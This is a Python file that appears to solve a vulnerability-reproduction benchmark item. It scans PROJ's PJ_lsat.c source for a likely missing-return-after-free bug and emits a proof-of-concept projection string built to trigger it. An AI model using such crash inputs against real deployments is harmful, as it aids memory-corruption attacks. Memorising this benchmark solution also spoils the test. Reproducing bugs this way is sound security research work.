import os
import re
import tarfile
import zipfile
import tempfile
import shutil
from typing import Optional


def _strip_c_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.DOTALL)
    text = re.sub(r"//[^\n\r]*", "", text)
    return text


def _extract_archive(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path

    tmpdir = tempfile.mkdtemp(prefix="src_")
    try:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                def is_within_directory(directory: str, target: str) -> bool:
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

                for member in tf.getmembers():
                    member_path = os.path.join(tmpdir, member.name)
                    if not is_within_directory(tmpdir, member_path):
                        continue
                    tf.extract(member, tmpdir)
            return tmpdir
        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path) as zf:
                zf.extractall(tmpdir)
            return tmpdir
    except Exception:
        shutil.rmtree(tmpdir, ignore_errors=True)
        raise

    shutil.rmtree(tmpdir, ignore_errors=True)
    raise ValueError("Unsupported or invalid archive")


def _find_file(root: str, filename: str) -> Optional[str]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == filename:
                return os.path.join(dirpath, fn)
    return None


def _find_projection_name(text: str) -> str:
    m = re.search(r"\bPROJ_HEAD\s*\(\s*([A-Za-z0-9_]+)\s*,", text)
    if m:
        return m.group(1)
    m = re.search(r"\bPROJECTION\s*\(\s*([A-Za-z0-9_]+)\s*\)", text)
    if m:
        return m.group(1)
    return "lsat"


def _extract_projection_block(text: str, projname: str) -> str:
    pat = re.compile(r"\bPROJECTION\s*\(\s*" + re.escape(projname) + r"\s*\)")
    m = pat.search(text)
    if not m:
        m = re.search(r"\bPROJECTION\s*\(\s*lsat\s*\)", text, flags=re.IGNORECASE)
    if not m:
        return text
    start = m.start()
    m2 = re.search(r"\bPROJECTION\s*\(", text[m.end():])
    end = len(text) if not m2 else (m.end() + m2.start())
    return text[start:end]


def _call_without_return(block: str, func_name: str) -> bool:
    for m in re.finditer(r"\b" + re.escape(func_name) + r"\s*\(", block):
        i = m.start() - 1
        while i >= 0 and block[i].isspace():
            i -= 1
        j = i
        while j >= 0 and (block[j].isalnum() or block[j] == "_"):
            j -= 1
        word = block[j + 1:i + 1]
        if word != "return":
            return True
    return False


def _has_return_P(block: str) -> bool:
    return re.search(r"\breturn\s*\(\s*P\s*\)\s*;", block) is not None or re.search(r"\breturn\s+P\s*;", block) is not None


def _param_keywords(block: str) -> set:
    kws = set()
    for m in re.finditer(r"\bpj_param\s*\([^;]*?,\s*\"([^\"]+)\"\s*\)", block):
        s = m.group(1)
        if not s:
            continue
        # Drop leading type/flag character (typical PROJ pattern)
        if len(s) >= 2 and (s[0].isalpha() or s[0] in "01"):
            kw = s[1:]
        else:
            kw = s
        kw = kw.strip()
        if kw:
            kws.add(kw)
    return kws


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_archive(src_path)
        created_tmp = (root != src_path) and (not os.path.isdir(src_path) or os.path.abspath(root) != os.path.abspath(src_path))
        try:
            lsat_path = _find_file(root, "PJ_lsat.c")
            if not lsat_path:
                # Fallback: common alternate casing
                for cand in ("pj_lsat.c", "PJ_LSAT.c"):
                    lsat_path = _find_file(root, cand)
                    if lsat_path:
                        break

            text = ""
            if lsat_path and os.path.isfile(lsat_path):
                with open(lsat_path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()

            text_nc = _strip_c_comments(text)
            projname = _find_projection_name(text_nc) if text_nc else "lsat"
            block = _extract_projection_block(text_nc, projname) if text_nc else ""

            kws = _param_keywords(block) if block else set()
            sat_key = "lsat" if ("lsat" in kws or "lsat" in text_nc) else ("sat" if ("sat" in kws or "sat" in text_nc) else "lsat")
            path_key = "path" if ("path" in kws or "path" in text_nc) else "path"

            # Determine which path likely triggers the bug
            want_sphere = False
            if block:
                if _call_without_return(block, "pj_default_destructor") or _call_without_return(block, "pj_default_destructor"):
                    want_sphere = True
                elif _call_without_return(block, "pj_free") or _call_without_return(block, "pj_dealloc"):
                    want_sphere = True

            if block and not want_sphere:
                # If success path is missing return P, a valid ellipsoidal definition is safer
                if not _has_return_P(block):
                    want_sphere = False
                else:
                    # Default to sphere-trigger attempt if any P->es checks exist
                    if re.search(r"\bP\s*->\s*es\b", block):
                        want_sphere = True

            # Build PoC
            tokens = [f"+proj={projname}"]

            if want_sphere:
                tokens.append("+R=1")
            else:
                tokens.append("+a=2")
                tokens.append("+b=1")

            # Add likely required parameters (doesn't hurt if unused)
            tokens.append(f"+{path_key}=1")
            tokens.append(f"+{sat_key}=1")

            poc = " ".join(tokens).encode("ascii", "ignore")
            return poc
        finally:
            if created_tmp and os.path.isdir(root):
                shutil.rmtree(root, ignore_errors=True)